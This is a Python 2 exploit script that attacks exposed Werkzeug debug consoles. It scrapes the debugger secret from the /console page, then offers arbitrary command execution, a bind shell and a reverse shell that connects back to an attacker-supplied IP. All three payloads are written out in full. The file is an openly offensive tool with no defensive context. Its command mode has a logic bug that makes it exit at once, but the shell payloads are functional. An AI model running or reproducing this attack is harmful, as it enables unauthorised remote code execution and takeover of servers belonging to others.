#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests
import re
import time


'''
Tested On:
0.9.6
0.10.4
'''


logo = '''
   *                  (
 (  `               ) )\ )                      ) 
 )\))(   (       ( /((()/(           )  (    ( /( 
((_)()\  )\  (   )\())/(_))`  )   ( /(  )(   )\())
(_()((_)((_) )\ (_))/(_))  /(/(   )(_))(()\ ((_)\ 
|  \/  | (_)((_)| |_ / __|((_)_\ ((_)_  ((_)| |(_)
| |\/| | | |(_-<|  _|\__ \| '_ \)/ _` || '_|| / / 
|_|  |_| |_|/__/ \__||___/| .__/ \__,_||_|  |_\_\ 
'''

print logo

baseUrl = sys.argv[1]
basePort = sys.argv[2]

#INITIAL CONNECTION WITH THE TARGET..
print u"\n\u001b[32;1mConnecting To The Target...\u001b[0m\n"
res = requests.get('http://%s:%s/console'% (baseUrl,basePort))

#Checking for Werkzeug Console..
if "Werkzeug powered traceback interpreter" not in res.text:
	print u"\u001b[31;1mWerkzeug Console Not Found!\u001b[0m"
	sys.exit(1)
print u"\u001b[32;1mWerkzeug Console Successfully Found!\u001b[0m\n"

# Extracting the SECRET KEY..
searchRegex = re.compile(r'[a-zA-Z0-9]{20}')
if "SECRET" not in res.text:
	print u"\u001b[31;1mSecret Key Not Found!\u001b[0m"
	sys.exit(1)
secret = searchRegex.findall(res.text)
secret = secret[0]
print u"\u001b[34;1mSECRET KEY IS:\u001b[0m " + u"\u001b[33;1m" + secret + u"\u001b[0m\n"

time.sleep(1)

#Menu Text..
mainText = "Select from the Menu:"

mainMenu = ('''
1) Sending Commands (Non-Interactive).
2) Bind Shell.
3) Reverse Shell.
4) Quit.''')

#Defining Bind Shell..
def bindShell():
	port = raw_input("Listening Port: ")
	payload = '''import os,pty,socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(('%s',%s));s.listen(1);(rem, addr)=s.accept();os.dup2(rem.fileno(),0);'''\
	'''os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/bash");s.close();'''%(baseUrl,port)

	print u"\n\u001b[35;1mTrying to Create Bind Shell..\u001b[0m\n"
	print u"\n\u001b[35;1mREMEMBER TO USE NETCAT TO CONNECT TO THE TARGET IP ALONG WITH THE PORT YOU ENTERED..\u001b[0m\n"

	parameters = {
        '__debugger__': 'yes',
        'cmd': payload,
        'frm': '0',
        's': secret
    }

	resp = requests.get('http://%s:%s/console' % (baseUrl,basePort), params=parameters)

#Defining Sending Commands..
def eCommands():
	while True:
		eCommand = raw_input('cmd> ')
		payload = '''from __future__ import print_function; import os; rex = lambda cmd, os=os: print(os.popen(cmd).read()); rex('%s')'''%(eCommand)
		if eCommand == "exit" or "quit":
			sys.exit(0)

		print u"\n\u001b[35;1mSending Your Command..\u001b[0m\n"

		parameters = {
        '__debugger__': 'yes',
        'cmd': payload,
        'frm': '0',
        's': secret
    	}

		resp = requests.get('http://%s:%s/console' % (baseUrl,basePort), params=parameters)
		print u"\u001b[44m[+] Response From Server\u001b[0m\n"
		print u"\u001b[46m[+] Status Code: " + str(resp.status_code) + u"\u001b[0m\n"
		print "Response: " + str((resp.text).encode('utf8'))

#Defining Reverse Shell..
def revShell():
	attackerIP = raw_input('Enter Your Attacker IP: ')
	port = raw_input("Enter Your Attacker Listening Port: ")

	payload = '''import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0);'''\
	'''os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close();'''%(attackerIP,port)

	print u"\n\u001b[35;1mTrying to Create Reverse Shell..\u001b[0m\n"
	print u"\n\u001b[35;1mREMEMBER TO USE NETCAT TO WAIT FOR THE CONNECTION..\u001b[0m\n"

	parameters = {
        '__debugger__': 'yes',
        'cmd': payload,
        'frm': '0',
        's': secret
    }

	resp = requests.get('http://%s:%s/console' % (baseUrl,basePort), params=parameters)

#User Choices..
while True:
	try:
		print mainText
		print mainMenu
		userInput = raw_input('''> ''')
		print "\n"

		if userInput == "1": # Sending Commands (Non-Interactive). 
			eCommands()
		if userInput == "2": # Bind Shell.
			bindShell()
		if userInput == "3": # Reverse Shell.
			revShell()
		if userInput == "4": # Quit.
			sys.exit(0)
		else:
			pass
	except KeyboardInterrupt:
		print "\n\nEnded By The User!!"
		sys.exit(0)